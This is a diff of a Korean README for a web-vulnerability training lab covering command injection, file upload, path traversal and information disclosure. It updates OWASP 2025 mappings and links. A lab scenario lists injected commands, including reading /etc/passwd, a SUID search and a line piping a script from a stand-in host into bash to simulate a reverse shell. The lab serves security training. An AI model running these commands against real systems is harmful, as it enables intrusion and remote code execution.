@@ -1,4 +1,4 @@
-# 02_web_cwe — 웹 취약점 유형별 실습
+# web_cwe — 웹 취약점 유형별 실습
 
 CWE(Common Weakness Enumeration) 기반 웹 취약점을 실습 환경에서 재현하고 대응 방법을 학습합니다. 각 문서는 취약점 유형별 원리, PoC, 대응을 포함합니다.
 
@@ -41,10 +41,10 @@ CWE(Common Weakness Enumeration) 기반 웹 취약점을 실습 환경에서 재
 
 | CWE     | 취약점 유형              | OWASP    | 파일                                                           |
 |---------|--------------------------|----------|----------------------------------------------------------------|
-| CWE-78  | OS Command Injection     | A03:2021 | [cwe_078_command_injection.md](./cwe_078_command_injection.md) |
-| CWE-434 | Unrestricted File Upload | A04:2021 | [cwe_434_file_upload.md](./cwe_434_file_upload.md)             |
-| CWE-22  | Path Traversal           | A01:2021 | [cwe_022_path_traversal.md](./cwe_022_path_traversal.md)       |
-| CWE-200 | Information Disclosure   | A01:2021 | [cwe_200_info_disclosure.md](./cwe_200_info_disclosure.md)     |
+| CWE-78  | OS Command Injection     | A05:2025 | [cwe_078_command_injection.md](./cwe_078_command_injection.md) |
+| CWE-434 | Unrestricted File Upload | A06:2025 | [cwe_434_file_upload.md](./cwe_434_file_upload.md)             |
+| CWE-22  | Path Traversal           | A01:2025 | [cwe_022_path_traversal.md](./cwe_022_path_traversal.md)       |
+| CWE-200 | Information Disclosure   | A01:2025 | [cwe_200_info_disclosure.md](./cwe_200_info_disclosure.md)     |
 
 [⬆ 목차로 돌아가기](#목차)
 
@@ -99,7 +99,7 @@ ansible-playbook -i ../../05_vagrant/inventory.ini setup_webshell_lab.yml --limi
 2. 입력: id
 3. 입력: cat /etc/passwd
 4. 입력: find / -perm -4000 -type f 2>/dev/null   (SUID 파일 탐색)
-5. 입력: curl http://attacker.com/shell.sh | bash  (리버스 셸 시뮬레이션)
+5. 입력: curl http://attacker.example/shell.sh | bash  (리버스 셸 시뮬레이션)
 ```
 
 ### 시나리오 2: File Upload → 웹셸 설치
@@ -203,8 +203,9 @@ max_file_uploads = 5
 ## 참고 자료
 
 - OWASP Top 10: [owasp.org/www-project-top-ten](https://owasp.org/www-project-top-ten/) — ★★★☆☆
+- OWASP Top 10:2025(현행판, CWE 매핑): [top10.owasp.org/2025](https://top10.owasp.org/2025/) — ★★★☆☆
 - CWE List: [cwe.mitre.org](https://cwe.mitre.org/) — ★★★☆☆
-- [01_cve (CVE 분석)](../cve/README.md)
+- [cve (CVE 분석)](../cve/README.md)
 
 ---
 
@@ -221,6 +222,6 @@ max_file_uploads = 5
 
 **작성일**: 2026-07-02
 
-**마지막 업데이트**: 2026-07-02
+**마지막 업데이트**: 2026-11-09
 
 © 2026 siasia86. Licensed under CC BY 4.0.
